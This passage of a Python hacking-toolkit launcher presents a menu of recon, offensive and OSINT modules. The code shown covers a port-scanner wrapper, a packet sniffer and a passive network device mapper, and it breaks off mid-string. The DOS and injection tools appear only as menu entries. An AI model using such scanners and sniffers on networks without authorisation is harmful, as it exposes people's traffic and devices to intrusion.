#npcap benötigt
import socket
from colorama import init, Fore, Style, Back
from scapy.all import sniff, IP, TCP, UDP, ICMP, Ether, send, sendp
from tqdm import tqdm
import threading
import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin
from requests.exceptions import RequestException
import time
import subprocess
import random
import sys
import os
from Crypto.Util.number import getPrime, inverse, GCD as gcd
from math import gcd
import colorama
from colorama import Fore, Style
colorama.init()
asciipicture = random.randint(0,7)
os.system('cls' if os.name == 'nt' else 'clear')
ascii1 = r"""
                                                                                                                                                       
    b.             8 8 8888888888   `8.`8888.      ,8' 8 8888      88    d888888o.      d888888o.       ,o888888o.           .8.          b.             8 
    888o.          8 8 8888          `8.`8888.    ,8'  8 8888      88  .`8888:' `88.  .`8888:' `88.    8888     `88.        .888.         888o.          8 
    Y88888o.       8 8 8888           `8.`8888.  ,8'   8 8888      88  8.`8888.   Y8  8.`8888.   Y8 ,8 8888       `8.      :88888.        Y88888o.       8 
    .`Y888888o.    8 8 8888            `8.`8888.,8'    8 8888      88  `8.`8888.      `8.`8888.     88 8888               . `88888.       .`Y888888o.    8 
    8o. `Y888888o. 8 8 888888888888     `8.`88888'     8 8888      88   `8.`8888.      `8.`8888.    88 8888              .8. `88888.      8o. `Y888888o. 8 
    8`Y8o. `Y88888o8 8 8888             .88.`8888.     8 8888      88    `8.`8888.      `8.`8888.   88 8888             .8`8. `88888.     8`Y8o. `Y88888o8 
    8   `Y8o. `Y8888 8 8888            .8'`8.`8888.    8 8888      88     `8.`8888.      `8.`8888.  88 8888            .8' `8. `88888.    8   `Y8o. `Y8888 
    8      `Y8o. `Y8 8 8888           .8'  `8.`8888.   ` 8888     ,8P 8b   `8.`8888. 8b   `8.`8888. `8 8888       .8' .8'   `8. `88888.   8      `Y8o. `Y8 
    8         `Y8o.` 8 8888          .8'    `8.`8888.    8888   ,d8P  `8b.  ;8.`8888 `8b.  ;8.`8888    8888     ,88' .888888888. `88888.  8         `Y8o.` 
    8            `Yo 8 888888888888 .8'      `8.`8888.    `Y88888P'    `Y8888P ,88P'  `Y8888P ,88P'     `8888888P'  .8'       `8. `88888. 8            `Yo 
"""
ascii2 = r"""
                                                                                          
        @@@  @@@  @@@@@@@@  @@@  @@@  @@@  @@@   @@@@@@    @@@@@@    @@@@@@@   @@@@@@   @@@  @@@  
        @@@@ @@@  @@@@@@@@  @@@  @@@  @@@  @@@  @@@@@@@   @@@@@@@   @@@@@@@@  @@@@@@@@  @@@@ @@@  
        @@!@!@@@  @@!       @@!  !@@  @@!  @@@  !@@       !@@       !@@       @@!  @@@  @@!@!@@@  
        !@!!@!@!  !@!       !@!  @!!  !@!  @!@  !@!       !@!       !@!       !@!  @!@  !@!!@!@!  
        @!@ !!@!  @!!!:!     !@@!@!   @!@  !@!  !!@@!!    !!@@!!    !@!       @!@!@!@!  @!@ !!@!  
        !@!  !!!  !!!!!:      @!!!    !@!  !!!   !!@!!!    !!@!!!   !!!       !!!@!!!!  !@!  !!!  
        !!:  !!!  !!:        !: :!!   !!:  !!!       !:!       !:!  :!!       !!:  !!!  !!:  !!!  
        :!:  !:!  :!:       :!:  !:!  :!:  !:!      !:!       !:!   :!:       :!:  !:!  :!:  !:!  
        ::   ::   :: ::::   ::  :::  ::::: ::  :::: ::   :::: ::    ::: :::  ::   :::   ::   ::  
        ::    :   : :: ::    :   ::    : :  :   :: : :    :: : :     :: :: :   :   : :  ::    :   
                                                                                                
                                                                                                """
ascii3 = r"""
        █▀▀▀▄  █▀▀█  ▄▀▀▀▀▀▀▀▀█ █▀▀█   █▀▀█ █▀▀█   █▀▀█  ▄▀▀▀▀▀▀▀▀█  ▄▀▀▀▀▀▀▀▀█  ▄▀▀▀▀▀▀▀▀█  ▄▀▀▀▀▀▀▀▄  █▀▀▀▄  █▀▀█
        █    ▀▄█  █ █  █▄▄▄▄▄▄█ █  █   █  █ █  █   █  █ █   ▄▄▄▄▄▄█ █   ▄▄▄▄▄▄█ █  █▄▄▄▄▄▄█ █   ▄▄▄   █ █    ▀▄█  █
        █  █▄  ▀  █ █  █▄▄▄▄▄   █  ▀▄▄▄▀  █ █  █   █  █ █  ▀▄▄▄▄    █  ▀▄▄▄▄    █  █        █  █   █  █ █  █▄  ▀  █
        ▀  █ ▀▄   ▄ ▀       █    ▀       ▄  ▀  ▀   ▄  ▄  ▀▄     ▀▄   ▀▄     ▀▄  ▀  ▀        ▀  ▀▄▄▄█  ▄ ▀  █ ▀▄   ▄
        █  █   █  █ █  █▀▀▀▀▀   █  ▄▀▀▀▄  █ █  █   █  █    ▀▀▀▀▄  █    ▀▀▀▀▄  █ █  █        █         █ █  █   █  █
        █  █   █  █ █  █▀▀▀▀▀▀█ █  ▀   █  █ █   ▀▀▀   █ █▀▀▀▀▀▀   █ █▀▀▀▀▀▀   █ █  █▀▀▀▀▀▀█ █  █▀▀▀█  █ █  █   █  █
        █▄▄█   █▄▄█  ▀▄▄▄▄▄▄▄▄█ █▄▄█   ▄▄▄█  ▀▄▄▄▄▄▄▄▀  █▄▄▄▄▄▄▄▄▀  █▄▄▄▄▄▄▄▄▀   ▀▄▄▄▄▄▄▄▄█ █▄▄█   █▄▄█ █▄▄█   █▄▄█
"""
ascii4 = r"""
        ▄▀▀▀▀▀▄   ▄▀▀▀▀▀▄  █▀▓   ▒▄  █▀▒   ▓▄   ▄▀▀▀▀▀▄   ▄▀▀▀▀▀▄   ▄▀▀▀▀▀▄   ▄▀▀▀▀▀▄   ▄▀▀▀▀▀▄ 
        ▓ ▄▀▀▀▄ ▓ ▓ ▄▀▀▀▄ ▒ ▓ ░   ░ ▒ ▓ ░   ░ ▓ ▓ ▄▀▀▀▄ ▓ ▓ ▄▀▀▀▄ ▓ ▓ ▄▀▀▀▄ ▒ ▓ ▄▀▀▀▄ ▓ ▓ ▄▀▀▀▄ ▓
        ▒ ▒   ░ ▒ ▒ ▓▄▄ ░▄░ ▒ ▒  ▄▀ ░ ▒ ▒   ░ ▒ ▒ ▀▄  ▀▀▀ ▒ ▀▄  ▀▀▀ ▒ ▒   ░▄░ ▒ ▒   ░ ▒ ▒ ▒   ░ ▒
        ░ ▓   ▒ ░ ▒ ░▒▒▌    ▀▄ ▀▀ ▄▀  ░ ░   ▒ ░  ▀▄ ▀▀▀▄   ▀▄ ▀▀▀▄  ▒ ▓       ▒ ░▒░░░ ░ ░ ▓   ▒ ░
        █ █   ▓ ▓ █ ▓   ▓▀▓ ▒ ▄▀▀▄ ▀▄ █ █   ▓ ▓ ▄▄▄▀▀▀▄ ▓ ▄▄▄▀▀▀▄ ▓ █ ▓   ▓▀▓ █ █▀▀▀░ ▓ █ █   ▓ ▓
        █ █   ▒ ░ █ ▀▄▄▄▀ ░ █ █   ▒ ▒ █ ▀▄▄▄▀ ░ █ ▀▄▄▄▀ ░ █ ▀▄▄▄▀ ░ █ ▀▄▄▄▀ ░ █ █   ▒ ▒ █ █   ▒ ░
        ▒▄█   ░▀   ▀▄▄▄▄▄▀  █▀    ▀▄░  ▀▄▄▄▄▄▀   ▀▄▄▄▄▄▀   ▀▄▄▄▄▄▀   ▀▄▄▄▄▄▀  █▄█   ▓▄░ ▒▄█   ░▀ 
"""
ascii5 = r"""
    ▄▄▄▄▄▄▄         ▄▄▀▀▀████░░▒▓▄   ▄     ▄▄                ▄▓▄▄          ▄▄▄▄▄               ▄▄▄▄▄          ▄▄▀▀▀████░░▒▓▄     ▄▄▄▄▄▄▄           ▄▄▄▄▄▄▄       
    ▄█▀▀▀█░░▒▓▓▄     ▀  ▄     ▀███▒▓▌ █▓▓   ░▒▒▓▓▄       ▄█▀   ▐▒▓▓▄     ▄▄███░░▒▒▓▄▌        ▄▄███░░▒▒▓▄▌      ▀  ▄     ▀███▒▓▌  ▄█▀▀▀█░░▒▓▓▄      ▄█▀▀▀█░░▒▓▓▄    
    ▀▄  ▄   ▀ ░▒▓▓▄     ▐▒▓      ▀██▒▓ ▒░▓   ▀ ░▒▓▓▌    ▄▒▓      █▒▓▓▄  ▄▀▀ ▄   ▀ ░▒▓▌      ▄▀▀ ▄   ▀ ░▒▓▌        ▐▒▓      ▀██▒▓ ▀▄  ▄   ▀ ░▒▓▓▄   ▀▄  ▄   ▀ ░▒▓▓▄  
        ▐▒▓    ▀█░▒▓▌    ▐░░        ░   ▐░░▌   ▐█░▒▓    ▐░░▌      ▐░░▒▓   ▀ ▐▓▓    ▀░▀        ▀ ▐▓▓    ▀░▀         ▐░░        ░      ▐▒▓    ▀█░▒▓▌     ▐▒▓    ▀█░▒▓▌ 
        ▐░░      ▀█░░    ▐░░  ▄    ▀     ▀▀█▄  █░▒▀     ▐░░        ██░▒▌    ▐▒░    ▄▄▄▄▄        ▐▒░    ▄▄▄▄▄       ▐░░       ▀       ▐░░  ▄   ▀█░░     ▐░░      ▀█░░ 
        ▐░░       ▐█░▌    ▒▌ ▐▒▌             ▄███▄▄▄     ▒█        ███░▌     ▀  ▄██░▒▓▓▒░▄       ▀  ▄██░▒▓▓▒░▄      ▒▌               ▐░░ ▐▒▌   ▐█░▌    ▐░░       ▐█░▌
        ▒▌         █     ▓▌  ▀    ▀▄     ▄▓   ▀██░▒▓▄   ▐▓▌      ▐██░█▌      ▄█▀▀   ▀▀░▒▓▄       ▄█▀▀   ▀▀░▒▓▄     ▓▌       ▀▄       ▒▌  ▀      █      ▒▌         █ 
        ▓▌        ▐▌     █         ▒▓▄  ▄░▀     ██░▒▓▌   ▀█▄     ██░██                ▐░▒▓▌               ▐░▒▓▌    █         ▒▓▄     ▓▌        ▐▌      ▓▌        ▐▌ 
        █         █      ▐       ▄█░▒▓ ▐▒▌      ▐█░▒▓▌  ▄  ▀█▀ ▄████       ▀▄        ▄█░▒▓     ▀▄        ▄█░▒▓     ▐       ▄█░▒▓     █         █       █         █  
        ▐        ▄▀    ▀▄▄   ▄▄▄█░█░░▀  ▀▓▄     █░▒▓░    ▀█▄▄▄████▀▀         ▀█▄▄▄▄███░▒▀        ▀█▄▄▄▄███░▒▀    ▀▄▄   ▄▄▄█░█░░▀     ▐        ▄▀       ▐        ▄▀  
                ▀         ▀▀▀▀▀▀▀▀▀              ▀▀▀       ▀▀▀▀▀                ▀▀▀▀▀▀              ▀▀▀▀▀▀          ▀▀▀▀▀▀▀▀▀                ▀                 ▀    
"""
ascii6 = r"""
        ▄▀▀▀█▄     ░▄▄  ▄▀▀▀▀▀▀▀▒▒▄   ▄▀▀▀▀▄     ▀▒▄  ├▄▄▄▒─┐   ▒▄▄─┐     ▄▄▄▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄    ▄▄▒▒▀▀▀▀▄       ▄▒▒▀▀▀▀▒▒▄      ▄▀▀▀█▄     ░▄▄ 
        ▀▄▐▓▄▀░   ▐▒▓▓░ ▀▄ ▓     ▀▓▌     ▓▄▀     ▓▓▓▓ ├░▒▓▒░█   ▓▓▓▓▌  ▄▌▀ ░░▒▓▓▀▀▒▓▌  ▄▌▀ ░░▒▓▓▀▀▒▓▌  ▓▓▓▓▌           ▐▓▀     ▐▓▓▓     ▀▄▐▓▄▀░   ▐▒▓▓░
        ▐▀▓▌ ▒▄  ▀▀▀▀   ▐▀   ▄▌ ▀     ▐▀ ▄     ▀▀▀▀ ▀▀▀▀▀▐■  ┌▀▀▀▀▀ ▐█▓▄  ▒▓▀    ■  ▐█▓▄  ▒▓▀    ■   ▀▀▀▀             ▀       ▀▀▀▌      ▐▀▓▌ ▒▄  ▀▀▀▀
        ▀▄██▄▀  ▓█▄████   ██▀▀█▀         ▄███▄ ▄█▀▀▀  ████▌'   │▐████ ▐█▓▒░▒▄▄        ▐█▓▒░▒▄▄        ████▌             ▄▄▀▀▀ ▀ ████    ▀▄██▄▀  ▓█▄████
        ▐▓▓▌    █▓▓▓▓▌  ▐▓▓             ▄▓▓▀ ▀▓▓▓▄   ▓▓▓▓┌┘   │▐▓▓▓▓  ▀▓▒░▓▓▒▓▒░▄     ▀▓▒░▓▓▒▓▒░▄    ▓▓▓▓▌            ▓▓┤      ├▓▓▓▌    ▐▓▓▌    █▓▓▓▓▌
        ▐▒▒▌     ▒▒▒▒▌  ▀▒▒           ▀▒▒▌    ▐▒▒▒▒▌ ▒▒▒▒▌│   ░▓▒▒▒▒     ▀▀▄▓▓▒░▓▒▄      ▀▀▄▓▓▒░▓▒▄  ▒▒▒▒▌           ▐▒▒│      ├▐▒▒▒    ▐▒▒▌     ▒▒▒▒▌
        ▐░░▌     ▐░░░▌   ░░      ▀▄    ░░▌     ▐░░░▌ ▐░░░▌:  ░█▌░░░▌         ▀▀█▒█▓▌         ▀▀█▒█▓▌ ▐░░░▌           ▐░░▌─┐    └┐░░░▌   ▐░░▌     ▐░░░▌
        ▐██▌      ███▌  ▐██▄     ▐█▌  ▐██▌      ███▌ └████ ░▒▓█████   ▄    ▄▓▒░ ▀▒▓▌  ▄    ▄▓▒░ ▀▒▓▌  ████      ▄▄▄  ▐███▄│    ▄├▐███   ▐██▌      ███▌
        ▄████▄      ▀█▌ ▄█████▄▄▄▄█▀  ▄████▄    ▄▀▀█▌ └┬▀▀██▀▀▀██▀▀   ▐▓▒▄▄▓▓▒░   ▐▀  ▐▓▒▄▄▓▓▒░   ▐▀    ▀▀██▄▄██▀▀  ▀  ▀██████▀▀ └▄███▌ ▄████▄      ▀█▌
                                                               ▀▀▀▀▀▀▀▀▀▀▀     ▀▀▀▀▀▀▀▀▀▀▀                                                     
"""
ascii7 = r"""
▀██▀███▀    ▀██▀██▀ ▀█████████████▀▄ ▄▀█▄▀▀▄     ▄▀█▄▀▀▄   ▄▀███▀▄   ▄▀███▀▄     ▄▄████▀▄██▄         ▄▄████▀▄██▄            ▄▄███████▄ ▄       ▀████▄▄         ▀██▀███▀    ▀██▀██▀
█▄▀██▀ ▄▀   █ █▄█ █ █▄▄▀▀▀▀▀▀▀▀▀▀▄██ █▄▀█▀▄█     █▄▀█▀▄█   ██▄▀▄██   ██▄▀▄██    ▄▄▀█▀   ▀ ▀██       ▄▄▀█▀   ▀ ▀██        ▄▀█▄▀██████▀▄██       ▄ ▀▀███▀        █▄▀██▀ ▄▀   █ █▄█ █
██▄▀ ▄█▄▀   ██▄▀▄██ ██▀▀        ▀▀██ ▀█▄▀▄██    ▀██▄▀▄██   ███ ███   ███ ███   ███▀▄▄   ▄█▄▀██     ███▀▄▄   ▄█▄▀██     ▄█▄▀▄▀█▄ ▀▀▀ ▀███        ▀██▄▀▄██       ██▄▀ ▄█▄▀   ██▄▀▄██
███ █████▄  ███ ███ ▄ ▄▄▄▄▄▄▄▄▄▄▄▄ ▄  ▀  ▀█▀   ▄▓▄▀█ ██▀   ███ ███   ███ ███   ▀█ ███▄   ▀   ▀     ▀█ ███▄   ▀   ▀    ███▀▄▄█▄        ▀█     ▄▄▄▄▀███ ███      ███ █████▄  ███ ███
█▄█ ███ ▀▄▀▄▀██ ███ ██▄▀█████████ ██ ▀▄░▄ ▄▄██▄▄▄▄░▄█▀ ▄▄  ███ ███   ███ ███    ▀▀▄ ▀█▀▄▄▄▄         ▀▀▄ ▀█▀▄▄▄▄      ▐██ ███▀               ▄ ███▀ ███ ██▄     █▄█ ███ ▀▄▀▄▀██ ███
▄▀█ ██ ▀ ▄█▄▀▄█ ███ █▀           ▀██ ▐█■▓▌▐█▀▀▀▀█▀▄██ █■░█ ███ ███   ███ ███          ▀████▀ ▄            ▀████▀ ▄   ██▌▐██▌                █▄▀▀▄█  ██▌▐██     ▄▀█ ██ ▀ ▄█▄▀▄█ ███
▄▄▄ ██▄   ▀████ ███                ▀ ▄▀▀ ▄▄ █  ▀▄▄▄▀█ ▀▓▀▌ ███ ▄▀█   █▀▄ ███ ▄▀███▀▄    ▄▄▄ ▀██▄ ▄▀███▀▄    ▄▄▄ ▀██▄ ██▌▐██          ▄▄▄   ██▀▄██▀   ██ ███    ▄▄▄ ██▄   ▀████ ███
▀▄█ ██     ▀███ ███ █▄▀██████████▀██  ▄█ ███▐    ███ █▄▄ │ ▀███▄▀▄▄▄▄▄▀▄███▀ ██▄▀▄██   ▄███▀ ███ ██▄▀▄██   ▄███▀ ███ ▐██▄▀█▀▄███████▀▄██  ██▀▄█▀▄▄▄▄▄▀██ ███   ▀▄█ ██     ▀███ ███
▄██ ██ ▀    ▄██ ███ ███ ▀▀▀▀▀▀▀▀ ███ ███ ███     ███ ███    ▀████▄▀▀▀▄████▀  ███▄ ▀▄██▄▀▀▀▄▄███▀ ███▄ ▀▄██▄▀▀▀▄▄███▀  ▀███▄ █▀▀    ▄▄▀██ █▀▄█▀▄███████▄▀ ████  ▄██ ██ ▀    ▄██ ███
█▀   ▀█▄    ▄▀   ▀█ █▀            ▀█ █▀   ▀█     █▀   ▀█      ▀▀█     █▀▀     ▀██▀      ▀█████▀   ▀██▀      ▀█████▀     ▀██▄        ▀█▄▀ ▄██▀            █████ █▀   ▀█▄    ▄▀   ▀█
"""
ascii8 = r"""
    ▄▄▄  ▄  ▄▄▄   ▄▄▄▄▄▀▄     ▄▄▄▄▄ ▄▄▄▄   ▄▄▄▄          ▄▄▄▄▄       ▄▄▄▄▄      ▄▄▄▄▄▀▄     ▄▄▄▄▄       ▄▄▄  ▄  ▄▄▄  
    ▐▄▄▄▀▀▄▀▀▄▄▄▀▄▀▄▄▄▄▄█▄▀▄ ▄▀▄▄▄▄▄▀▄▄▄▄▀▄▀▄▄▄▄▄▄▌▄▄▄▀▄▄▀▄▄▄▄▄▀▀▄  ▄▀▄▄▄▄▄▀▀▄  ▀▄▄▄▄▄█▄▀▄ ▄▀▄▄▄▄▄▀▀▄   ▐▄▄▄▀▀▄▀▀▄▄▄▀▄
    ▐ ▓▓█▄ ▀▀ ▓ ▌ ▐ ▓▓ ▄▄▄▀▄▀ ▐ ▓▓ ▄▐ ▓▓ ▌ ▐ ▓▓ ▀ ▌██▐▀  ▐ ▓▓ ▄▀▀▄▀▌ ▐ ▓▓ ▄▀▀▄▀▌▐ ▓▓ ▄▄▄▀▄▀ ▐ ▓▓ ▄▀▀▄▀▌ ▐ ▓▓█▄ ▀▀ ▓ ▌ 
    ▐ ▒▒▀▓█▄▀▄▒ ▌ ▐ ▒▒▄▄▄▀█▄▀ ▐ ▒▒ ▌▐ ▒▒ ▌ ▐ ▒▒ ▌ ▌▓▓▐   ▐ ▒▒ ▌▀▀▀▀  ▐ ▒▒ ▌▀▀▀▀ ▐ ▒▒█▌  ▀▄▀ ▐ ▒▒ ▌▀█▓▌█ ▐ ▒▒▀▓█▄▀▄▒ ▌ 
    ▐ ░░█▄▀▓█▄░ ▌ ▐ ░░ ▄▄▀     ▀▄░ ▀▀ ░▄▀  ▐ ░░ ▌ ▌░▒▐   ▐▄▄▄ ▀▀▄▄▀▌ ▐▄▄▄ ▀▀▄▄▀▌▐ ░░ ▌      ▐ ░░ ▀▀▀▀▒▐ ▐ ░░█▄▀▓█▄░ ▌ 
    ▐ ███▌▀▄▀██ ▌ ▐ ██ ▌       ▄▄▀█▌▄ █▄▀  ▐ ███▌ ▌██▐    ▄▄▄▄ ▐ ▓▓▐  ▄▄▄▄ ▐ ▓▓▐▐ ██ ▌  ▄▄▄ ▐ ███▌▐████▌▐ ███▌▀▄▀██ ▌ 
    ▐ ▓▓█▌ ▐█▓▓ ▌ ▐ ▓▓ ▌  ▄   ▐ ▓▓█▌▐█▓▓█▌ ▐ ▓▓█▌ ▌█▓▐   ▐ ▄▄█▌▐█▒▒▐ ▐ ▄▄█▌▐█▒▒▐▐ ▓▓ ▌  ███ ▐ ▓▓█▌▐█▓▓█▌▐ ▓▓█▌ ▐█▓▓ ▌ 
    ▐ ▒▒█▌ ▐█▒▒ ▌ ▐ ▒▒ ▌▄▀▄▀▄ ▐ ▒▒█▌▐█▒▒█▌ ▐ ▒▒█▀▀▄▒▌▌   ▐ ▒▒█▌▐█░▌▌ ▐ ▒▒█▌▐█░▌▌▐ ▒▒ ▌▄▀▄▀▄ ▐ ▒▒█▌▐█▒▒█▌▐ ▒▒█▌ ▐█▒▒ ▌ 
    ▀▄░░▄▀▄▀▄░░▄▀▄▀▄░░▄▄▄▀▄▀ ▄▀▄░░█▌▐█░░▄▀▄▀▄░░▄░░▀▀▄   ▄▀▄░░▄▄▄▀▀▄ ▄▀▄░░▄▄▄▀▀▄ ▀▄░░▄▄▄▀▄▀ ▄▀▄░░█▌▐█░░█▌▀▄░░▄▀▄▀▄░░▄▀▄
    ▀▄▄▄▄▀ ▀▄▄▄▄▀ ▀▄▄▄▄▀▄▀    ▀▄▄▄▄▌▄▄▄▄▄▀ ▀▄▄▄▄▄▄▀▀     ▀▄▄▄▄▄▄▀▀   ▀▄▄▄▄▄▄▀▀  ▐▄▄▄▄▄▄▀    ▀▄▄▄▄▌▐▄▄▄▄▌▀▄▄▄▄▀ ▀▄▄▄▄▀ 
                   ▀                                                                                              
"""
HACKTOOL = [ascii1, ascii2, ascii2, ascii3, ascii4, ascii5, ascii6, ascii7, ascii8]
# Farbcodes -> ANSI Escape Sequenzen
RED = "\033[31m"
RESET = "\033[0m"
GREEN = "\033[32m"
BLUE = "\033[34m"
PURPLE = "\033[35m"
colors = [RED, GREEN, BLUE, PURPLE]
randomcolor = colors[random.randint(0, len(colors) - 1)]
intro = """
        Creator: S1BERIA                               VERSION: 3.0
        Last Updated: 10.08.2026                       Hack the shit out of them
"""
auswahl = """
        ╔═══   Reconaissance    ═══╗  ╔═══     Offensive      ═══╗  ╔═══    Open Source Intelligence    ═══╗ ╔═══           Cryptography           ═══╗
         1. Blackwire Port scanner     5. DOS Attack                 9. Sherlock                              12. RSA Encrypter
        ║2. Packet Sniffer (Admin) ║  ║6. SQLMAP (simplified)    ║  ║10.Mr. Holmes            -unfinished  ║ ║13. RSA Decrypter                       ║
        ║3. IP-MAC Mapper (Admin)  ║  ║7. Airbreak               ║  ║11.Spiderfoot            -unfinished  ║ ║12,13 Works only in this environment    ║
         4. CVE Lookup                 8. XSS Scanner                15. OSINT Dashboard                      16. Password generator
         18. Exploit Database           17.SQLi Vulnerability Scan                                             
        ╚═══                    ═══╝  ╚═══                    ═══╝  ╚═══                                ═══╝ ╚═══                                  ═══╝
         99. Settings
         100. Module docs
"""
print(randomcolor + HACKTOOL[asciipicture] + RESET)
print(randomcolor + intro + RESET)
print(auswahl)
try:

    auswahl1 = input(f"""{Fore.RED}
    ┌───({Fore.WHITE}User@nexusscan{Fore.RED})─[{Fore.WHITE}~/1{Fore.RED}]                    
    └──$  {Fore.WHITE}""")
except KeyboardInterrupt:
    print("\nInterrupted by user...")
    sys.exit()
except PermissionError:
    print("\nNo permissions to run the script")
    sys.exit()
except Exception as e:
    print(f"\nError: {e}")
    sys.exit()


match auswahl1:
    case "1":
        # Import BlackWire properly
        import blackwire
        
        print(Style.RESET_ALL)
        print("Starting blackwire.py ...")
        time.sleep(0.5)
        
        # Load CVE database
        blackwire.load_cve_db()
        
        print("=" * 50)
        print("1. Show manual")
        print("2. Show help")
        print("3. Use Blackwire (scan)")
        print("4. Web analysis")
        print("5. List top ports")
        print("6. Show security checks")
        
        while True:
            try:
                useblackwireinput = input(f"""{Fore.RED}
    ┌───({Fore.WHITE}User@blackwire{Fore.RED})─[{Fore.WHITE}~/1{Fore.RED}]                    
    └──$  {Fore.WHITE}""")
                
                if useblackwireinput == "1":
                    blackwire.show_manual()
                    
                elif useblackwireinput == "2":
                    blackwire.show_help()
                    
                elif useblackwireinput == "3":
                    target = input(f"{Fore.YELLOW}Enter target IP/hostname: {Style.RESET_ALL}")
                    if not target:
                        print(f"{Fore.RED}[!] No target specified.{Style.RESET_ALL}")
                        continue
                    ports_choice = input(f"{Fore.YELLOW}Ports? (default=top-100, 'all'=1-65535, or range like '1-1000'): {Style.RESET_ALL}").strip()
                    threads = input(f"{Fore.YELLOW}Threads? (default=50): {Style.RESET_ALL}").strip()
                    timeout = input(f"{Fore.YELLOW}Timeout? (default=2.0s): {Style.RESET_ALL}").strip()
                    
                    # Build argv for BlackWire scan
                    sys.argv = ['blackwire.py', 'scan', '-t', target]
                    if ports_choice.lower() == 'all':
                        sys.argv += ['-p', '1-65535']
                    elif ports_choice:
                        sys.argv += ['-p', ports_choice]
                    if threads:
                        sys.argv += ['-n', threads]
                    if timeout:
                        sys.argv += ['--timeout', timeout]
                    
                    try:
                        blackwire.main()
                    except SystemExit:
                        pass
                    except Exception as e:
                        print(f"{Fore.RED}[!] Scan error: {e}{Style.RESET_ALL}")
                        
                elif useblackwireinput == "4":
                    domain = input(f"{Fore.YELLOW}Enter domain for web analysis: {Style.RESET_ALL}").strip()
                    if not domain:
                        print(f"{Fore.RED}[!] No domain specified.{Style.RESET_ALL}")
                        continue
                    sys.argv = ['blackwire.py', 'web', '-t', domain, '--header', '--subdomains']
                    try:
                        blackwire.main()
                    except SystemExit:
                        pass
                    except Exception as e:
                        print(f"{Fore.RED}[!] Web analysis error: {e}{Style.RESET_ALL}")
                        
                elif useblackwireinput == "5":
                    blackwire.show_port_list()
                    
                elif useblackwireinput == "6":
                    blackwire.show_checks()
                    
                elif useblackwireinput == "":
                    print("Exiting BlackWire module...")
                    break
                    
                else:
                    print(f"{Fore.RED}[!] Unknown option. Try 1-6.{Style.RESET_ALL}")
                    
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}[!] Interrupted by user.{Style.RESET_ALL}")
                break
    case "2":
        packet_box = r"""
       __________
      /         /|
     /_________/ |
    | PACKET  |  |
    | SNIFFER|  |
    |_________| /
    (_________)/ 
"""

        print(packet_box)
        last_packet_time = time.time()
        IDLE_TIMEOUT = 10

        # Dictionary für IP → Farbe
        ip_colors = {}
        colors = [
            "\033[91m",  # rot
            "\033[92m",  # grün
            "\033[93m",  # gelb
            "\033[94m",  # blau
            "\033[95m",  # magenta
            "\033[96m",  # cyan
        ]
        RESET_COLOR = "\033[0m"
        # Farben der IP Adresse in Dictionary speichern, damit gleiche IPs immer gleiche Farbe haben
        def get_color(ip):
            if ip not in ip_colors:
                ip_colors[ip] = colors[len(ip_colors) % len(colors)]
            return ip_colors[ip]
        #Packet Sniffer
        def process_packet(packet):
            global last_packet_time
            last_packet_time = time.time()

            print("\n=== New packet ===")

            if packet.haslayer(IP):
                ip_layer = packet[IP]
                src_color = get_color(ip_layer.src)
                dst_color = get_color(ip_layer.dst)
                # Ausgabe der IP-Adressen mit Farben, damit man sie leichter unterscheiden kann
                print(f"Source IP: {src_color}{ip_layer.src}{RESET_COLOR}")
                print(f"Target IP:   {dst_color}{ip_layer.dst}{RESET_COLOR}")
                print(f"TTL:       {ip_layer.ttl}")

                if packet.haslayer(TCP):
                    tcp_layer = packet[TCP]
                    print("[TCP]")
                    print(f"Port (src): {tcp_layer.sport}")
                    print(f"Port (dst): {tcp_layer.dport}")
                    print(f"Flags:      {tcp_layer.flags}")

                elif packet.haslayer(UDP):
                    udp_layer = packet[UDP]
                    print("[UDP]")
                    print(f"Port (src): {udp_layer.sport}")
                    print(f"Port (dst): {udp_layer.dport}")

                elif packet.haslayer(ICMP):
                    print("[ICMP] Ping / Network diagnostics")
            else:
                print("No IP packet detected")

        def stop_filter(packet):
            global last_packet_time
            if time.time() - last_packet_time > IDLE_TIMEOUT:
                print("Idle timeout!")
                return True
            return False

        filteryn = input("IP Filter y/n: ")
        if filteryn.lower() == "y":
            ip_filter = input("IP-adress: ")
            sniff(filter=f"host {ip_filter}", prn=process_packet, stop_filter=stop_filter)
        elif filteryn.lower() == "n":
            sniff(prn=process_packet, stop_filter=stop_filter)
        else:
            print("Invalid input!")
    case "3":
        ipmapmapper = r"""
 _  ____    _      ____  ____    _      ____  ____  ____  _____ ____ 
/ \/  __\  / \__/|/  _ \/   _\  / \__/|/  _ \/  __\/  __\/  __//  __\
| ||  \/|  | |\/||| / \||  /    | |\/||| / \||  \/||  \/||  \  |  \/|
| ||  __/  | |  ||| |-|||  \__  | |  ||| |-|||  __/|  __/|  /_ |    /
\_/\_/     \_/  \|\_/ \|\____/  \_/  \|\_/ \|\_/   \_/   \____\\_/\_\
                                                                     
                                                                               
        ┌───────────────────────────────────────────────┐
        │        IP → MAC → HOSTNAME RESOLVER           │
        │      Passive Network Discovery Scanner        │
        └───────────────────────────────────────────────┘

                [*] Sniffing Network Traffic...
                [*] Detecting Devices...
                [*] Resolving Hostnames...
"""

        print(ipmapmapper)
        time.sleep(2)
      
        from scapy.all import sniff, IP, Ether
        import socket

        seen_devices = set()
        def get_hostname(ip):
            try:
               
                hostname = socket.gethostbyaddr(ip)[0]
                return hostname
            except socket.herror:
             
                return "Unknown"

        def process_packet(packet):
            if packet.haslayer(IP):
                src_ip = packet[IP].src
                
          
                if src_ip.startswith("192.168.") and src_ip not in seen_devices:
                    
                    # BSSID/MAC extrahieren
                    bssid_mac = packet[Ether].src if packet.haslayer(Ether) else "Not found"
                    
                    # Hostnamen abfragen
                    name = get_hostname(src_ip)
                    
                    print(f"[DEVICE FOUND]")
                    print(f"  IP:       {src_ip}")
                    print(f"  Hostname: {name}")
                    print(f"  BSSID/MAC: {bssid_mac}")
                    print("-" * 30)
                    
                    seen_devices.add(src_ip)
        
        print("Search the network for devices, names, and BSSIDs...")
        print("(Make sure you have administrator privileges to run this program)")

        # Sniffe ohne Limit (store=0 spart Arbeitsspeicher)
        sniff(prn=process_packet, store=0)
    case "4":
        # CVE Exploit Database — reference lookup backed by the local NVD cache.
        # The cve_lookup.py tool uses bare imports (import db_handler, ...), so it
        # must run with its own directory as the working dir for them to resolve.
        CVE_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "cve_exploit_database")
        CVE_SCRIPT = os.path.join(CVE_DIR, "cve_lookup.py")

        CVE_ASCII = r"""
